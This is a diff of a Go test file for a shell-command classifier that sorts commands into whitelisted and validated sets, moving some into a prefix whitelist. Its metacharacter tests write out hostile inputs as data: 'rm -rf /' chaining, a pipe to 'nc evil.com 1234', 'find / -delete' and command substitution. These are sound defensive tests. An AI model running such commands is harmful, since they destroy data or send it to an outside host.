@@ -2,38 +2,28 @@ package main
 
 import "testing"
 
-// TestClassifyWhitelisted verifies that bare whitelisted commands with no arguments
-// are classified as "whitelisted".
-func TestClassifyWhitelisted(t *testing.T) {
-	cases := []struct {
-		cmd  string
-		name string
-	}{
-		{"ls", "bare ls"},
-		{"pwd", "bare pwd"},
-		{"date", "bare date"},
-		{"whoami", "bare whoami"},
-		{"env", "bare env"},
-		{"tree", "bare tree"},
-		{"uname", "bare uname"},
-	}
-	for _, tc := range cases {
-		t.Run(tc.name, func(t *testing.T) {
-			got := classifyCommand(tc.cmd)
-			if got != "whitelisted" {
-				t.Errorf("classifyCommand(%q) = %q, want %q", tc.cmd, got, "whitelisted")
-			}
-		})
-	}
-}
-
-// TestClassifyExactWhitelisted verifies that exact command strings including arguments
-// are classified as "whitelisted".
+// TestClassifyExactWhitelisted verifies that exact-match whitelisted commands
+// (both bare commands and full commands with specific arguments) are classified
+// as "whitelisted".
 func TestClassifyExactWhitelisted(t *testing.T) {
 	cases := []struct {
 		cmd  string
 		name string
 	}{
+		// Bare commands.
+		{"pwd", "bare pwd"},
+		{"date", "bare date"},
+		{"whoami", "bare whoami"},
+		{"env", "bare env"},
+		{"tree", "bare tree"},
+		{"id", "bare id"},
+		{"hostname", "bare hostname"},
+		{"uptime", "bare uptime"},
+		{"df", "bare df"},
+		{"free", "bare free"},
+		{"ps", "bare ps"},
+		{"history", "bare history"},
+		// Full commands with specific arguments.
 		{"home-manager switch --rollback", "home-manager rollback"},
 		{"home-manager generations", "home-manager generations"},
 		{`nix develop --command sh -c "figlet 'Nix' | cowsay -n | lolcat -f"`, "nix develop figlet cowsay lolcat"},
@@ -49,15 +39,35 @@ func TestClassifyExactWhitelisted(t *testing.T) {
 	}
 }
 
-// TestClassifyWhichWhitelisted verifies that which commands with safe arguments
-// are classified as "whitelisted".
-func TestClassifyWhichWhitelisted(t *testing.T) {
+// TestClassifyPrefixWhitelisted verifies that prefix-whitelisted commands are
+// classified as "whitelisted" when invoked bare or with arguments and no shell metacharacters.
+func TestClassifyPrefixWhitelisted(t *testing.T) {
 	cases := []struct {
 		cmd  string
 		name string
 	}{
+		{"ls", "bare ls"},
+		{"ls -la", "ls with flags"},
+		{"ls -la /tmp", "ls with flags and path"},
+		{"uname", "bare uname"},
+		{"uname -a", "uname with flag"},
+		{"cat README.md", "cat with file"},
+		{"cat /etc/passwd", "cat with path"},
+		{"head -n 10 file.txt", "head with args"},
+		{"tail -f log.txt", "tail with args"},
+		{"grep foo bar.txt", "grep with args"},
+		{"cd /tmp", "cd with path"},
+		{"echo hello", "echo with args"},
+		{"echo hello world", "echo with multiple args"},
+		{"wc -l file.txt", "wc with args"},
+		{"file README.md", "file with arg"},
+		{"du -sh .", "du with args"},
+		{"stat file.txt", "stat with arg"},
+		{"realpath .", "realpath with arg"},
+		{"printf '%s\\n' hello", "printf with args"},
 		{"which pokemonsay", "which pokemonsay"},
 		{"which ls", "which ls"},
+		{"  ls -la  ", "ls with surrounding spaces"},
 		{"  which cowsay  ", "which cowsay with spaces"},
 	}
 	for _, tc := range cases {
@@ -70,16 +80,22 @@ func TestClassifyWhichWhitelisted(t *testing.T) {
 	}
 }
 
-// TestClassifyWhichWithMetachars verifies that which commands containing
+// TestClassifyPrefixWithMetachars verifies that prefix-whitelisted commands containing
 // shell metacharacters are classified as "validated".
-func TestClassifyWhichWithMetachars(t *testing.T) {
+func TestClassifyPrefixWithMetachars(t *testing.T) {
 	cases := []struct {
 		cmd  string
 		name string
 	}{
-		{"which foo; rm -rf /", "semicolon chaining"},
-		{"which foo && echo pwned", "ampersand chaining"},
-		{"which foo | cat", "pipe operator"},
+		{"cat /etc/passwd; rm -rf /", "cat with semicolon chaining"},
+		{"echo hello | nc evil.com 1234", "echo with pipe"},
+		{"ls && rm -rf /", "ls with ampersand chaining"},
+		{"grep foo bar.txt > /tmp/out", "grep with redirect"},
+		{"cat file `whoami`", "cat with backtick"},
+		{"echo $(id)", "echo with command substitution"},
+		{"which foo; rm -rf /", "which with semicolon chaining"},
+		{"which foo && echo pwned", "which with ampersand chaining"},
+		{"which foo | cat", "which with pipe"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -132,17 +148,18 @@ func TestClassifyWhitelistedWithSurroundingSpaces(t *testing.T) {
 	}
 }
 
-// TestClassifyWhitelistedWithArgs verifies that whitelisted commands with arguments
-// are classified as "validated" because arguments can be abused.
-func TestClassifyWhitelistedWithArgs(t *testing.T) {
+// TestClassifyBareWhitelistedWithArgs verifies that bare-only whitelisted commands
+// with arguments are classified as "validated" because arguments can be abused.
+func TestClassifyBareWhitelistedWithArgs(t *testing.T) {
 	cases := []struct {
 		cmd  string
 		name string
 	}{
-		{"ls -la /tmp", "ls with flags"},
-		{"uname -a", "uname with flag"},
 		{"tree .", "tree with path"},
 		{"env FOO=bar", "env with assignment"},
+		{"df -h", "df with flag"},
+		{"free -m", "free with flag"},
+		{"ps aux", "ps with flags"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -168,9 +185,9 @@ func TestClassifyValidated(t *testing.T) {
 		{"go build ./...", "go command"},
 		{"docker run hello", "docker command"},
 		{"make all", "make command"},
-		{"echo hello", "echo with args"},
-		{"cat /etc/passwd", "cat with path"},
-		{"cd /tmp", "cd with path"},
+		{"ssh user@host", "ssh command"},
+		{"find . -name '*.go'", "find command"},
+		{"find / -delete", "find with delete"},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
